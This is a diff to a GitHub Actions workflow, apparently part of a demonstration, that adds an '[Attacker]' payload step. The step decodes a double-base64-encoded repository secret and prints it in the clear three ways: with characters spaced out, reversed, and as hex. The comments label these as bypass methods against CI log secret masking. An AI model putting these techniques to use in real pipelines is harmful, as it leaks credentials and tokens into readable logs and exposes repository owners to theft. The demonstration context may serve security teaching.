@@ -31,7 +31,17 @@ jobs:
           decoded=$(echo "$encoded" | base64 --decode | base64 --decode)
           echo "$decoded"
           echo ""
-          echo "[Attacker] SECRET FINAL EN CLAIR : $decoded"
+          echo "[Attacker] SECRET FINAL EN CLAIR (avec bypass) :"
+          # Méthode 1 : Ajouter des espaces entre chaque caractère
+          echo "$decoded" | sed 's/./& /g'
+          echo ""
+          echo "[Attacker] SECRET EN REVERSE :"
+          # Méthode 2 : Afficher à l'envers
+          echo "$decoded" | rev
+          echo ""
+          echo "[Attacker] SECRET EN HEX :"
+          # Méthode 3 : Convertir en hexadécimal
+          echo "$decoded" | xxd -p
           echo "===== FIN DU PAYLOAD ====="
         env:
           DEMO_SECRET: ${{ secrets.DEMO_SECRET1 }}
